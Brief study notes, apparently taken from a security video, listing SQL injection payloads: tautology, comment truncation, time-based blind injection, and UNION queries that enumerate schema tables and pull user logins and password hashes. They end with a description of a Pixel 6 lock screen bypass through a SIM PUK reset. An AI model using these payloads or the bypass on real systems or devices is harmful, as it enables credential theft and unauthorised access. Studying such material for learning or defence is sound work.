SELECT password from ? WHERE john' or '1'='1
SELECT * FROM country WHERE name' or '1'='1

Examples from the Video:
SELECT ? FROM ? WHERE ? LIKE '%screws%';
SELECT ? FROM ? WHERE ? LIKE '%';-- %';
SELECT ? FROM ? WHERE ? LIKE '--
SELECT ? FROM ? WHERE ? LIKE '%screws' AND 1=SLEEP(2);
SELECT ? FROM ? WHERE ? LIKE '%screws' UNION (SELECT 1,2,3 FROM dual);
SELECT ?,?,? FROM WHERE ? LIKE '%screws' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);
SELECT ? FROM ? WHERE ? LIKE '%screws' UNION (SELECT uLogin, uHash, uType from Users);

How the Pixel 6 Full Lockscreen Bypass hack works is the attacker inserts a sim and locks it 3 times until it reaches PUK lock code and then types in PUK and the phone lets attacker reset pin code and enters the new code bypassing the old password and the lock screen.
